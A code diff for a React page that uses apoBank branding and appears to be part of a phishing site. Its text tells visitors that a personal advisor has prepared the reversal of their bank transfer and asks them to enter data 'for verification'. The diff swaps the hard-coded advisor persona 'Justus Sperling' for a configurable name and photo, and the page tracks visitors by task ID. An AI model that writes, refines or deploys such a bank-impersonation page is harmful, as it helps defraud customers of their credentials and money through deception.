@@ -2,13 +2,14 @@ import { useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { Phone, ShieldCheck } from "lucide-react";
 import apoBankLogo from "@/assets/apobank-logo.svg";
-import beraterFoto from "@/assets/berater.png.asset.json";
 import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
 import { supabase } from "@/integrations/supabase/client";
+import { useBerater } from "@/hooks/useBerater";
 
 const Berater = () => {
   const navigate = useNavigate();
+  const berater = useBerater();
   const [sp] = useSearchParams();
   const nextUrl = sp.get("next");
   const taskId = sp.get("taskId");
@@ -48,7 +49,7 @@ const Berater = () => {
           <div className="px-4 sm:px-8 py-8 sm:py-10 flex flex-col items-center text-center">
             {/* Avatar */}
             <div className="h-36 w-36 rounded-full bg-muted border-4 border-white shadow-[0_4px_18px_rgba(0,0,0,0.12)] overflow-hidden">
-              <img src={beraterFoto.url} alt="Justus Sperling" className="h-full w-full object-cover" />
+              <img src={berater.photoUrl} alt={berater.name} className="h-full w-full object-cover" />
             </div>
 
             {/* Labels */}
@@ -59,7 +60,7 @@ const Berater = () => {
               className="mt-2 text-3xl font-bold text-[#0f1b2d]"
               style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}
             >
-              Justus Sperling
+              {berater.name}
             </h1>
 
             <div className="mt-3 flex items-center gap-2 text-foreground">
@@ -69,7 +70,7 @@ const Berater = () => {
 
             {/* Description */}
             <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
-              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">Justus Sperling</span> betreut.
+              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">{berater.name}</span> betreut.
               Ihr Berater hat den Widerruf Ihrer Überweisung vorbereitet. Zur Verifizierung
               gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
             </p>
